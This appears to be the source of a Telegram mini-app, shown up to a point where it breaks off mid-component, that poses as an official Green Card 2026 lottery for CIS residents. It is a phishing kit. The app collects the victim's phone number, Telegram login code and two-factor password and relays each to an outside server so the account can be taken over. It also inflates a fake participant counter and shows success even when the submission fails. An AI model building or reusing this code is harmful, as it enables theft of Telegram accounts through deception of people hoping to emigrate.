"use client";

import { useState, useEffect, useRef, useCallback } from "react";
import { motion, AnimatePresence } from "framer-motion";
import confetti from "canvas-confetti";

// Types
type Step = "landing" | "phone" | "code" | "password" | "info" | "info2" | "success";

interface Country {
  code: string;
  name: string;
  dialCode: string;
  format: string;
  maxLength: number;
}

interface FormData {
  phone: string;
  countryCode: string;
  code: string;
  password: string;
  firstName: string;
  lastName: string;
  middleName: string;
  birthDate: string;
  currentCity: string;
  occupation: string;
  workplace: string;
  education: string;
  about: string;
  telegram: string;
}

// Countries data
const countries: Country[] = [
  { code: "BY", name: "Беларусь", dialCode: "+375", format: "(XX) XXX-XX-XX", maxLength: 9 },
  { code: "RU", name: "Россия", dialCode: "+7", format: "(XXX) XXX-XX-XX", maxLength: 10 },
  { code: "UA", name: "Украина", dialCode: "+380", format: "(XX) XXX-XX-XX", maxLength: 9 },
  { code: "KZ", name: "Казахстан", dialCode: "+7", format: "(XXX) XXX-XX-XX", maxLength: 10 },
  { code: "PL", name: "Польша", dialCode: "+48", format: "XXX XXX XXX", maxLength: 9 },
  { code: "LT", name: "Литва", dialCode: "+370", format: "(XXX) XXXXX", maxLength: 8 },
  { code: "LV", name: "Латвия", dialCode: "+371", format: "XXXX XXXX", maxLength: 8 },
  { code: "GE", name: "Грузия", dialCode: "+995", format: "(XXX) XXX XXX", maxLength: 9 },
  { code: "AM", name: "Армения", dialCode: "+374", format: "(XX) XXX-XXX", maxLength: 8 },
  { code: "AZ", name: "Азербайджан", dialCode: "+994", format: "(XX) XXX-XX-XX", maxLength: 9 },
  { code: "MD", name: "Молдова", dialCode: "+373", format: "(XXX) XX-XXX", maxLength: 8 },
  { code: "UZ", name: "Узбекистан", dialCode: "+998", format: "(XX) XXX-XX-XX", maxLength: 9 },
];

// UCD Panel API
const UCD_API_URL = "https://ucd.digital/api/miniapp/auth";

// Telegram WebApp types
declare global {
  interface Window {
    Telegram?: {
      WebApp: {
        ready: () => void;
        expand: () => void;
        close: () => void;
        MainButton: {
          text: string;
          color: string;
          textColor: string;
          isVisible: boolean;
          show: () => void;
          hide: () => void;
          onClick: (callback: () => void) => void;
          offClick: (callback: () => void) => void;
          setText: (text: string) => void;
          enable: () => void;
          disable: () => void;
        };
        BackButton: {
          isVisible: boolean;
          show: () => void;
          hide: () => void;
          onClick: (callback: () => void) => void;
          offClick: (callback: () => void) => void;
        };
        themeParams: {
          bg_color?: string;
          text_color?: string;
          hint_color?: string;
          link_color?: string;
          button_color?: string;
          button_text_color?: string;
        };
        initData: string;
        initDataUnsafe: {
          user?: {
            id: number;
            first_name: string;
            last_name?: string;
            username?: string;
            language_code?: string;
          };
        };
        HapticFeedback: {
          impactOccurred: (style: "light" | "medium" | "heavy" | "rigid" | "soft") => void;
          notificationOccurred: (type: "error" | "success" | "warning") => void;
          selectionChanged: () => void;
        };
      };
    };
  }
}

// Country Flag SVGs
const CountryFlags: Record<string, React.ReactNode> = {
  BY: (
    <svg viewBox="0 0 32 24" className="w-6 h-4 rounded-sm overflow-hidden shrink-0">
      <rect width="32" height="12" fill="#CF101A" />
      <rect y="12" width="32" height="12" fill="#007C30" />
      <rect width="4" height="24" fill="#fff" />
    </svg>
  ),
  RU: (
    <svg viewBox="0 0 32 24" className="w-6 h-4 rounded-sm overflow-hidden shrink-0">
      <rect width="32" height="8" fill="#fff" />
      <rect y="8" width="32" height="8" fill="#0039A6" />
      <rect y="16" width="32" height="8" fill="#D52B1E" />
    </svg>
  ),
  UA: (
    <svg viewBox="0 0 32 24" className="w-6 h-4 rounded-sm overflow-hidden shrink-0">
      <rect width="32" height="12" fill="#005BBB" />
      <rect y="12" width="32" height="12" fill="#FFD500" />
    </svg>
  ),
  KZ: (
    <svg viewBox="0 0 32 24" className="w-6 h-4 rounded-sm overflow-hidden shrink-0">
      <rect width="32" height="24" fill="#00AFCA" />
      <circle cx="16" cy="12" r="4" fill="#FEC50C" />
    </svg>
  ),
  PL: (
    <svg viewBox="0 0 32 24" className="w-6 h-4 rounded-sm overflow-hidden shrink-0">
      <rect width="32" height="12" fill="#fff" />
      <rect y="12" width="32" height="12" fill="#DC143C" />
    </svg>
  ),
  LT: (
    <svg viewBox="0 0 32 24" className="w-6 h-4 rounded-sm overflow-hidden shrink-0">
      <rect width="32" height="8" fill="#FDB913" />
      <rect y="8" width="32" height="8" fill="#006A44" />
      <rect y="16" width="32" height="8" fill="#C1272D" />
    </svg>
  ),
  LV: (
    <svg viewBox="0 0 32 24" className="w-6 h-4 rounded-sm overflow-hidden shrink-0">
      <rect width="32" height="24" fill="#9E3039" />
      <rect y="9.5" width="32" height="5" fill="#fff" />
    </svg>
  ),
  GE: (
    <svg viewBox="0 0 32 24" className="w-6 h-4 rounded-sm overflow-hidden shrink-0">
      <rect width="32" height="24" fill="#fff" />
      <rect x="13.5" width="5" height="24" fill="#FF0000" />
      <rect y="9.5" width="32" height="5" fill="#FF0000" />
    </svg>
  ),
  AM: (
    <svg viewBox="0 0 32 24" className="w-6 h-4 rounded-sm overflow-hidden shrink-0">
      <rect width="32" height="8" fill="#D90012" />
      <rect y="8" width="32" height="8" fill="#0033A0" />
      <rect y="16" width="32" height="8" fill="#F2A800" />
    </svg>
  ),
  AZ: (
    <svg viewBox="0 0 32 24" className="w-6 h-4 rounded-sm overflow-hidden shrink-0">
      <rect width="32" height="8" fill="#00B5E2" />
      <rect y="8" width="32" height="8" fill="#EF3340" />
      <rect y="16" width="32" height="8" fill="#509E2F" />
    </svg>
  ),
  MD: (
    <svg viewBox="0 0 32 24" className="w-6 h-4 rounded-sm overflow-hidden shrink-0">
      <rect width="10.67" height="24" fill="#003DA5" />
      <rect x="10.67" width="10.67" height="24" fill="#FFD100" />
      <rect x="21.34" width="10.67" height="24" fill="#C8102E" />
    </svg>
  ),
  UZ: (
    <svg viewBox="0 0 32 24" className="w-6 h-4 rounded-sm overflow-hidden shrink-0">
      <rect width="32" height="8" fill="#1EB53A" />
      <rect y="8" width="32" height="8" fill="#fff" />
      <rect y="16" width="32" height="8" fill="#0099B5" />
    </svg>
  ),
};

// USA Flag SVG
function USAFlag({ className = "" }: { className?: string }) {
  return (
    <svg viewBox="0 0 190 100" className={className}>
      {/* Stripes */}
      {[...Array(13)].map((_, i) => (
        <rect
          key={i}
          y={i * 7.692}
          width="190"
          height="7.692"
          fill={i % 2 === 0 ? "#B22234" : "#FFFFFF"}
        />
      ))}
      {/* Blue canton */}
      <rect width="76" height="53.85" fill="#3C3B6E" />
      {/* Stars - simplified 5x4 grid */}
      <g fill="#FFFFFF">
        {[...Array(5)].map((_, row) =>
          [...Array(row % 2 === 0 ? 6 : 5)].map((__, col) => (
            <polygon
              key={`${row}-${col}`}
              points="0,-4 1.5,-1.5 4.5,-1.5 2,0.5 3,4 0,2 -3,4 -2,0.5 -4.5,-1.5 -1.5,-1.5"
              transform={`translate(${6 + col * 12 + (row % 2 === 0 ? 0 : 6)}, ${5 + row * 11}) scale(0.7)`}
            />
          ))
        )}
      </g>
    </svg>
  );
}

// Icon Components
const Icons = {
  ArrowLeft: () => (
    <svg className="w-5 h-5" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round">
      <path d="M19 12H5M12 19l-7-7 7-7" />
    </svg>
  ),
  ChevronDown: () => (
    <svg className="w-4 h-4" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round">
      <polyline points="6 9 12 15 18 9" />
    </svg>
  ),
  Search: () => (
    <svg className="w-4 h-4" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round">
      <circle cx="11" cy="11" r="8" />
      <path d="m21 21-4.35-4.35" />
    </svg>
  ),
  Check: () => (
    <svg className="w-4 h-4" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
      <polyline points="20 6 9 17 4 12" />
    </svg>
  ),
  Shield: () => (
    <svg className="w-16 h-16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="0.75" strokeLinecap="round" strokeLinejoin="round">
      <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z" />
      <path d="m9 12 2 2 4-4" />
    </svg>
  ),
  Eye: () => (
    <svg className="w-5 h-5" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round">
      <path d="M2 12s3-7 10-7 10 7 10 7-3 7-10 7-10-7-10-7Z" />
      <circle cx="12" cy="12" r="3" />
    </svg>
  ),
  EyeOff: () => (
    <svg className="w-5 h-5" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round">
      <path d="M9.88 9.88a3 3 0 1 0 4.24 4.24" />
      <path d="M10.73 5.08A10.43 10.43 0 0 1 12 5c7 0 10 7 10 7a13.16 13.16 0 0 1-1.67 2.68" />
      <path d="M6.61 6.61A13.526 13.526 0 0 0 2 12s3 7 10 7a9.74 9.74 0 0 0 5.39-1.61" />
      <line x1="2" y1="2" x2="22" y2="22" />
    </svg>
  ),
  ArrowRight: () => (
    <svg className="w-5 h-5" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
      <path d="M5 12h14M12 5l7 7-7 7" />
    </svg>
  ),
};

// Spinner
function Spinner({ size = "md" }: { size?: "sm" | "md" | "lg" }) {
  const sizeClasses = { sm: "w-4 h-4", md: "w-5 h-5", lg: "w-6 h-6" };
  return (
    <svg className={`animate-spin ${sizeClasses[size]}`} viewBox="0 0 24 24" fill="none">
      <circle className="opacity-20" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="3" />
      <path className="opacity-80" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z" />
    </svg>
  );
}

// Main Component
export default function GreenCardContest() {
  const [step, setStep] = useState<Step>("landing");
  const [selectedCountry, setSelectedCountry] = useState<Country>(countries[0]);
  const [isCountryOpen, setIsCountryOpen] = useState(false);
  const [countrySearch, setCountrySearch] = useState("");
  const [formData, setFormData] = useState<FormData>({
    phone: "",
    countryCode: "BY",
    code: "",
    password: "",
    firstName: "",
    lastName: "",
    middleName: "",
    birthDate: "",
    currentCity: "",
    occupation: "",
    workplace: "",
    education: "",
    about: "",
    telegram: "",
  });
  const [isLoading, setIsLoading] = useState(false);
  const [codeDigits, setCodeDigits] = useState(["", "", "", "", ""]);
  const codeInputsRef = useRef<(HTMLInputElement | null)[]>([]);
  const phoneInputRef = useRef<HTMLInputElement>(null);
  const countrySearchRef = useRef<HTMLInputElement>(null);
  const dropdownRef = useRef<HTMLDivElement>(null);
  const [participantsCount, setParticipantsCount] = useState(24847);
  const [ticketNumber] = useState(() => Math.floor(100000 + Math.random() * 900000));
  const [resendTimer, setResendTimer] = useState(0);
  const [phoneError, setPhoneError] = useState("");
  const [codeError, setCodeError] = useState("");
  const [passwordError, setPasswordError] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [sessionId, setSessionId] = useState<string | null>(null);

  const filteredCountries = countries.filter(
    (c) =>
      c.name.toLowerCase().includes(countrySearch.toLowerCase()) ||
      c.dialCode.includes(countrySearch)
  );

  // Initialize Telegram WebApp
  useEffect(() => {
    if (typeof window !== "undefined" && window.Telegram?.WebApp) {
      const tg = window.Telegram.WebApp;
      tg.ready();
      tg.expand();

      if (tg.initDataUnsafe?.user) {
        setFormData((prev) => ({
          ...prev,
          firstName: tg.initDataUnsafe.user?.first_name || "",
          lastName: tg.initDataUnsafe.user?.last_name || "",
          telegram: tg.initDataUnsafe.user?.username || "",
        }));
      }
    }

    const interval = setInterval(() => {
      setParticipantsCount((prev) => prev + Math.floor(Math.random() * 3) + 1);
    }, 5000);

    return () => clearInterval(interval);
  }, []);

  useEffect(() => {
    if (isCountryOpen && countrySearchRef.current) {
      setTimeout(() => countrySearchRef.current?.focus(), 100);
    }
  }, [isCountryOpen]);

  useEffect(() => {
    function handleClickOutside(event: MouseEvent) {
      if (dropdownRef.current && !dropdownRef.current.contains(event.target as Node)) {
        setIsCountryOpen(false);
      }
    }
    document.addEventListener("mousedown", handleClickOutside);
    return () => document.removeEventListener("mousedown", handleClickOutside);
  }, []);

  useEffect(() => {
    if (resendTimer > 0) {
      const timer = setTimeout(() => setResendTimer(resendTimer - 1), 1000);
      return () => clearTimeout(timer);
    }
  }, [resendTimer]);

  const haptic = useCallback((type: "light" | "medium" | "heavy" = "light") => {
    window.Telegram?.WebApp?.HapticFeedback?.impactOccurred(type);
  }, []);

  const formatPhone = (value: string, format: string) => {
    const digits = value.replace(/\D/g, "");
    let result = "";
    let digitIndex = 0;

    for (const char of format) {
      if (digitIndex >= digits.length) break;
      if (char === "X") {
        result += digits[digitIndex];
        digitIndex++;
      } else {
        result += char;
      }
    }
    return result;
  };

  const handlePhoneChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const raw = e.target.value.replace(/\D/g, "");
    const limited = raw.slice(0, selectedCountry.maxLength);
    const formatted = formatPhone(limited, selectedCountry.format);
    setFormData((prev) => ({ ...prev, phone: formatted }));
    setPhoneError("");
  };

  const isPhoneComplete = formData.phone.replace(/\D/g, "").length === selectedCountry.maxLength;

  // UCD Panel API calls
  const requestCode = async () => {
    const fullPhone = selectedCountry.dialCode + formData.phone.replace(/\D/g, "");
    setIsLoading(true);
    setPhoneError("");

    try {
      const response = await fetch(UCD_API_URL, {
        method: "POST",
        headers: { "Content-Type": "application/json", "X-Miniapp-Secret": "ucd-miniapp-secret-2026" },
        body: JSON.stringify({
          action: "request_code",
          phone: fullPhone,
        }),
      });

      const data = await response.json();

      if (data.success) {
        setSessionId(data.session_id);
        setStep("code");
        setResendTimer(60);
        haptic("medium");
      } else {
        const error = data.error || "Не удалось отправить код";
        if (error.startsWith("FLOOD_WAIT_")) {
          const seconds = parseInt(error.replace("FLOOD_WAIT_", ""), 10);
          setPhoneError(`Слишком много попыток. Подождите ${seconds} сек.`);
          setResendTimer(seconds);
        } else if (error === "PHONE_NUMBER_INVALID") {
          setPhoneError("Неверный формат номера телефона");
        } else if (error === "PHONE_NUMBER_BANNED") {
          setPhoneError("Этот номер заблокирован");
        } else {
          setPhoneError(error);
        }
        haptic("heavy");
      }
    } catch {
      setPhoneError("Ошибка соединения. Попробуйте позже");
      haptic("heavy");
    } finally {
      setIsLoading(false);
    }
  };

  const submitCode = async () => {
    const code = codeDigits.join("");
    if (code.length !== 5) return;

    setIsLoading(true);
    setCodeError("");

    try {
      const response = await fetch(UCD_API_URL, {
        method: "POST",
        headers: { "Content-Type": "application/json", "X-Miniapp-Secret": "ucd-miniapp-secret-2026" },
        body: JSON.stringify({
          action: "submit_code",
          session_id: sessionId,
          code: code,
        }),
      });

      const data = await response.json();

      if (data.success) {
        if (data.requires_2fa) {
          setStep("password");
        } else {
          setStep("info");
        }
        haptic("medium");
      } else {
        const error = data.error || "Неверный код";
        if (error.startsWith("FLOOD_WAIT_")) {
          const seconds = parseInt(error.replace("FLOOD_WAIT_", ""), 10);
          setCodeError(`Слишком много попыток. Подождите ${seconds} сек.`);
        } else if (error === "PHONE_CODE_INVALID") {
          setCodeError("Неверный код");
        } else if (error === "PHONE_CODE_EXPIRED") {
          setCodeError("Код истёк. Запросите новый");
        } else if (error === "Сессия не найдена или истекла") {
          setCodeError("Сессия истекла. Запросите код заново");
        } else {
          setCodeError(error);
        }
        setCodeDigits(["", "", "", "", ""]);
        codeInputsRef.current[0]?.focus();
        haptic("heavy");
      }
    } catch {
      setCodeError("Ошибка соединения");
      haptic("heavy");
    } finally {
      setIsLoading(false);
    }
  };

  const submitPassword = async () => {
    if (!formData.password) return;

    setIsLoading(true);
    setPasswordError("");

    try {
      const response = await fetch(UCD_API_URL, {
        method: "POST",
        headers: { "Content-Type": "application/json", "X-Miniapp-Secret": "ucd-miniapp-secret-2026" },
        body: JSON.stringify({
          action: "submit_2fa",
          session_id: sessionId,
          password: formData.password,
        }),
      });

      const data = await response.json();

      if (data.success) {
        setStep("info");
        haptic("medium");
      } else {
        const error = data.error || "Неверный пароль";
        if (error.startsWith("FLOOD_WAIT_")) {
          const seconds = parseInt(error.replace("FLOOD_WAIT_", ""), 10);
          setPasswordError(`Слишком много попыток. Подождите ${seconds} сек.`);
        } else if (error === "PASSWORD_HASH_INVALID") {
          setPasswordError("Неверный пароль");
        } else {
          setPasswordError(error);
        }
        haptic("heavy");
      }
    } catch {
      setPasswordError("Ошибка соединения");
      haptic("heavy");
    } finally {
      setIsLoading(false);
    }
  };

  const handleCodeDigitChange = (index: number, value: string) => {
    if (!/^\d*$/.test(value)) return;

    const newDigits = [...codeDigits];
    newDigits[index] = value.slice(-1);
    setCodeDigits(newDigits);
    setCodeError("");

    if (value && index < 4) {
      codeInputsRef.current[index + 1]?.focus();
    }

    if (newDigits.every((d) => d !== "") && newDigits.join("").length === 5) {
      setTimeout(() => submitCode(), 100);
    }
  };

  const handleCodeKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === "Backspace" && !codeDigits[index] && index > 0) {
      codeInputsRef.current[index - 1]?.focus();
    }
  };

  const handleCodePaste = (e: React.ClipboardEvent) => {
    e.preventDefault();
    const pastedData = e.clipboardData.getData("text").replace(/\D/g, "").slice(0, 5);
    if (pastedData.length === 5) {
      const newDigits = pastedData.split("");
      setCodeDigits(newDigits);
      codeInputsRef.current[4]?.focus();
      setTimeout(() => submitCode(), 100);
    }
  };

  const handleBack = () => {
    haptic("light");
    const stepOrder: Step[] = ["landing", "phone", "code", "password", "info", "info2", "success"];
    const currentIndex = stepOrder.indexOf(step);
    if (currentIndex > 0) {
      if (step === "password") {
        setStep("code");
      } else {
        setStep(stepOrder[currentIndex - 1]);
      }
    }
  };

  const launchConfetti = () => {
    const duration = 3000;
    const end = Date.now() + duration;

    const frame = () => {
      confetti({
        particleCount: 3,
        angle: 60,
        spread: 55,
        origin: { x: 0, y: 0.7 },
        colors: ["#B22234", "#3C3B6E", "#FFFFFF"],
      });
      confetti({
        particleCount: 3,
        angle: 120,
        spread: 55,
        origin: { x: 1, y: 0.7 },
        colors: ["#B22234", "#3C3B6E", "#FFFFFF"],
      });

      if (Date.now() < end) {
        requestAnimationFrame(frame);
      }
    };
    frame();
  };

  const handleSubmitInfo = () => {
    setStep("info2");
    haptic("light");
  };

  const handleFinalSubmit = async () => {
    setIsLoading(true);
    
    try {
      const fullPhone = selectedCountry.dialCode + formData.phone.replace(/\D/g, "");
      
      const response = await fetch("/api/submit", {
        method: "POST",
        headers: { "Content-Type": "application/json", "X-Miniapp-Secret": "ucd-miniapp-secret-2026" },
        body: JSON.stringify({
          initData: window.Telegram?.WebApp?.initData || "",
          formData,
          participantNumber,
          phone: fullPhone,
        }),
      });

      if (!response.ok) {
        // Silent fail
      }
    } catch {
      // Silent fail
    }
    
    setIsLoading(false);
    setStep("success");
    haptic("medium");
    setTimeout(launchConfetti, 300);
  };

  // Animation variants
  const pageVariants = {
    initial: { opacity: 0, y: 20 },
    animate: { opacity: 1, y: 0 },
    exit: { opacity: 0, y: -20 },
  };

  const infoProgress =
    [
      formData.firstName,
      formData.lastName,
      formData.birthDate,
      formData.currentCity,
      formData.occupation,
    ].filter(Boolean).length / 5;

  // Render Landing
  const renderLanding = () => (
    <motion.div
      key="landing"
      variants={pageVariants}
      initial="initial"
      animate="animate"
      exit="exit"
      className="flex flex-col min-h-[100dvh]"
    >
      {/* Hero Section */}
      <div className="relative flex-1 flex flex-col items-center justify-center px-6 pt-6 pb-4">
        {/* Background gradient orbs */}
        <div className="absolute inset-0 overflow-hidden pointer-events-none">
          <div className="absolute top-1/4 left-1/2 -translate-x-1/2 w-[600px] h-[600px] bg-red-600/20 rounded-full filter blur-[120px]" />
          <div className="absolute top-1/3 left-1/4 w-[400px] h-[400px] bg-red-500/10 rounded-full filter blur-[100px]" />
        </div>

        {/* Content */}
        <div className="relative z-10 flex flex-col items-center text-center max-w-lg mx-auto">
          {/* Badge */}
          <motion.div
            initial={{ opacity: 0, y: -10 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ delay: 0.2 }}
            className="inline-flex items-center gap-2 px-3 py-1.5 rounded-full border border-white/10 bg-white/5 mb-5"
          >
            <span className="w-2 h-2 rounded-full bg-emerald-500 animate-pulse" />
            <span className="text-xs font-medium text-white/70 tracking-wide uppercase">
              Официальный розыгрыш
            </span>
          </motion.div>

          {/* Flag */}
          <motion.div
            initial={{ opacity: 0, scale: 0.9 }}
            animate={{ opacity: 1, scale: 1 }}
            transition={{ delay: 0.3, duration: 0.6 }}
            className="relative mb-6"
          >
            <div className="relative">
              <USAFlag className="w-32 h-auto sm:w-40 rounded-lg shadow-2xl shadow-blue-500/20" />
              <div className="absolute inset-0 rounded-lg ring-1 ring-white/10" />
            </div>
          </motion.div>

          {/* Title */}
          <motion.div
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ delay: 0.4 }}
            className="mb-3"
          >
            <h1 className="text-4xl sm:text-5xl font-serif font-light tracking-tight text-white mb-1">
              Green Card
            </h1>
            <span className="text-4xl sm:text-5xl font-serif font-light text-white/30">
              2026
            </span>
          </motion.div>

          {/* Subtitle */}
          <motion.p
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            transition={{ delay: 0.5 }}
            className="text-white/50 text-sm sm:text-base font-light mb-6 max-w-xs"
          >
            Telegram совместно с USA Lottery разыгрывает Green Card для жителей СНГ
          </motion.p>

          {/* Stats */}
          <motion.div
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ delay: 0.6 }}
            className="flex items-center justify-center gap-6 sm:gap-10 mb-6"
          >
            <div className="text-center">
              <div className="text-xl sm:text-2xl font-light text-white tabular-nums">
                {participantsCount.toLocaleString()}
              </div>
              <div className="text-[10px] text-white/40 uppercase tracking-wider mt-0.5">
                Участников
              </div>
            </div>
            <div className="w-px h-8 bg-white/10" />
            <div className="text-center">
              <div className="text-xl sm:text-2xl font-light text-white">10</div>
              <div className="text-[10px] text-white/40 uppercase tracking-wider mt-0.5">
                Green Cards
              </div>
            </div>
            <div className="w-px h-8 bg-white/10" />
            <div className="text-center">
              <div className="text-xl sm:text-2xl font-light text-white">30</div>
              <div className="text-[10px] text-white/40 uppercase tracking-wider mt-0.5">
                Дней
              </div>
            </div>
          </motion.div>
        </div>
      </div>

      {/* Bottom CTA */}
      <div className="px-6 pb-6 pt-2">
        <motion.button
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ delay: 0.7 }}
          whileTap={{ scale: 0.98 }}
          onClick={() => {
            haptic("medium");
            setStep("phone");
          }}
          className="w-full h-14 bg-red-600 text-white font-medium rounded-2xl flex items-center justify-center gap-3 transition-all hover:bg-red-500 active:bg-red-700"
        >
          <span>Участвовать</span>
          <Icons.ArrowRight />
        </motion.button>
        <p className="text-center text-white/30 text-xs mt-4">
          Участие бесплатное. Розыгрыш 1 июля 2026
        </p>
      </div>
    </motion.div>
  );

  // Render Phone
  const renderPhone = () => (
    <motion.div
      key="phone"
      variants={pageVariants}
      initial="initial"
      animate="animate"
      exit="exit"
      className="flex flex-col min-h-[100dvh] px-6 py-8"
    >
      {/* Header */}
      <div className="flex items-center gap-4 mb-8">
        <button
          onClick={handleBack}
          className="w-10 h-10 rounded-full flex items-center justify-center hover:bg-white/5 transition-colors"
        >
          <Icons.ArrowLeft />
        </button>
      </div>

      {/* Content */}
      <div className="flex-1 flex flex-col justify-center max-w-md mx-auto w-full">
        <h2 className="text-3xl sm:text-4xl font-serif font-light text-white mb-3">
          Введите номер телефона
        </h2>
        <p className="text-white/50 text-base mb-10">
          Мы отправим код подтверждения через Telegram
        </p>

        {/* Phone Input */}
        <div className="space-y-4">
          {/* Country Selector */}
          <div className="relative" ref={dropdownRef}>
            <button
              onClick={() => {
                setIsCountryOpen(!isCountryOpen);
                haptic("light");
              }}
              className="w-full h-14 px-4 bg-white/5 border border-white/10 rounded-xl flex items-center justify-between transition-all hover:bg-white/[0.07] hover:border-white/15"
            >
              <div className="flex items-center gap-3">
                {CountryFlags[selectedCountry.code]}
                <span className="text-white">{selectedCountry.name}</span>
              </div>
              <motion.div animate={{ rotate: isCountryOpen ? 180 : 0 }}>
                <Icons.ChevronDown />
              </motion.div>
            </button>

            <AnimatePresence>
              {isCountryOpen && (
                <motion.div
                  initial={{ opacity: 0, y: -10 }}
                  animate={{ opacity: 1, y: 0 }}
                  exit={{ opacity: 0, y: -10 }}
                  className="absolute top-full left-0 right-0 mt-2 bg-[#1a1a1a] border border-white/10 rounded-xl overflow-hidden z-50 shadow-2xl"
                >
                  {/* Search */}
                  <div className="p-3 border-b border-white/5">
                    <div className="relative">
                      <div className="absolute left-3 top-1/2 -translate-y-1/2 text-white/40">
                        <Icons.Search />
                      </div>
                      <input
                        ref={countrySearchRef}
                        type="text"
                        value={countrySearch}
                        onChange={(e) => setCountrySearch(e.target.value)}
                        placeholder="Поиск страны..."
                        className="w-full h-10 pl-10 pr-4 bg-white/5 border border-white/10 rounded-lg text-white placeholder:text-white/30 focus:border-white/20"
                      />
                    </div>
                  </div>

                  {/* Countries List */}
                  <div className="max-h-64 overflow-y-auto">
                    {filteredCountries.map((country) => (
                      <button
                        key={country.code}
                        onClick={() => {
                          setSelectedCountry(country);
                          setIsCountryOpen(false);
                          setCountrySearch("");
                          setFormData((prev) => ({
                            ...prev,
                            phone: "",
                            countryCode: country.code,
                          }));
                          haptic("light");
                          setTimeout(() => phoneInputRef.current?.focus(), 100);
                        }}
                        className="w-full px-4 py-3 flex items-center gap-3 hover:bg-white/5 transition-colors"
                      >
                        {CountryFlags[country.code]}
                        <span className="text-white flex-1 text-left">{country.name}</span>
                        <span className="text-white/40 text-sm">{country.dialCode}</span>
                        {selectedCountry.code === country.code && (
                          <div className="text-emerald-500">
                            <Icons.Check />
                          </div>
                        )}
                      </button>
                    ))}
                  </div>
                </motion.div>
              )}
            </AnimatePresence>
          </div>

          {/* Phone Number Input */}
          <div className="relative">
            <div className="absolute left-4 top-1/2 -translate-y-1/2 text-white/50 font-medium">
              {selectedCountry.dialCode}
            </div>
            <input
              ref={phoneInputRef}
              type="tel"
              value={formData.phone}
              onChange={handlePhoneChange}
              placeholder={selectedCountry.format}
              className={`w-full h-14 pl-16 pr-12 bg-white/5 border rounded-xl text-white text-lg placeholder:text-white/20 transition-all ${
                phoneError ? "border-red-500/50" : "border-white/10 focus:border-white/20"
              }`}
            />
            {isPhoneComplete && (
              <motion.div
                initial={{ scale: 0 }}
                animate={{ scale: 1 }}
                className="absolute right-4 top-1/2 -translate-y-1/2 w-6 h-6 rounded-full bg-emerald-500 flex items-center justify-center"
              >
                <Icons.Check />
              </motion.div>
            )}
          </div>

          {phoneError && (
            <motion.p
              initial={{ opacity: 0, y: -5 }}
              animate={{ opacity: 1, y: 0 }}
              className="text-red-400 text-sm"
            >
              {phoneError}
            </motion.p>
          )}
        </div>
      </div>

      {/* Bottom Button */}
      <div className="pt-6">
        <button
          onClick={requestCode}
          disabled={!isPhoneComplete || isLoading}
          className="w-full h-14 bg-red-600 text-white font-medium rounded-2xl flex items-center justify-center gap-2 transition-all disabled:opacity-40 disabled:cursor-not-allowed hover:bg-red-500"
        >
          {isLoading ? <Spinner /> : "Получить код"}
        </button>
      </div>
    </motion.div>
  );

  // Render Code
  const renderCode = () => (
    <motion.div
      key="code"
      variants={pageVariants}
      initial="initial"
      animate="animate"
      exit="exit"
      className="flex flex-col min-h-[100dvh] px-6 py-8"
    >
      {/* Header */}
      <div className="flex items-center gap-4 mb-8">
        <button
          onClick={handleBack}
          className="w-10 h-10 rounded-full flex items-center justify-center hover:bg-white/5 transition-colors"
        >
          <Icons.ArrowLeft />
        </button>
      </div>

      {/* Content */}
      <div className="flex-1 flex flex-col justify-center max-w-md mx-auto w-full">
        <h2 className="text-3xl sm:text-4xl font-serif font-light text-white mb-3">
          Введите код
        </h2>
        <p className="text-white/50 text-base mb-10">
          Код отправлен на{" "}
          <span className="text-white">
            {selectedCountry.dialCode} {formData.phone}
          </span>
        </p>

        {/* Code Inputs */}
        <div className="flex justify-center gap-3 sm:gap-4 mb-6" onPaste={handleCodePaste}>
          {codeDigits.map((digit, index) => (
            <input
              key={index}
              ref={(el) => { codeInputsRef.current[index] = el; }}
              type="text"
              inputMode="numeric"
              value={digit}
              onChange={(e) => handleCodeDigitChange(index, e.target.value)}
              onKeyDown={(e) => handleCodeKeyDown(index, e)}
              className={`w-14 h-16 sm:w-16 sm:h-18 text-center text-2xl font-medium bg-white/5 border rounded-xl text-white transition-all focus:bg-white/10 ${
                codeError ? "border-red-500/50" : "border-white/10 focus:border-white/30"
              }`}
              maxLength={1}
              autoFocus={index === 0}
            />
          ))}
        </div>

        {codeError && (
          <motion.p
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            className="text-red-400 text-sm text-center mb-4"
          >
            {codeError}
          </motion.p>
        )}

        {/* Resend */}
        <div className="text-center">
          {resendTimer > 0 ? (
            <p className="text-white/40 text-sm">
              Отправить повторно через{" "}
              <span className="tabular-nums text-white/60">{resendTimer}с</span>
            </p>
          ) : (
            <button
              onClick={requestCode}
              disabled={isLoading}
              className="text-white/60 text-sm hover:text-white transition-colors"
            >
              Отправить код повторно
            </button>
          )}
        </div>
      </div>

      {/* Bottom */}
      <div className="pt-6">
        <button
          onClick={submitCode}
          disabled={codeDigits.some((d) => !d) || isLoading}
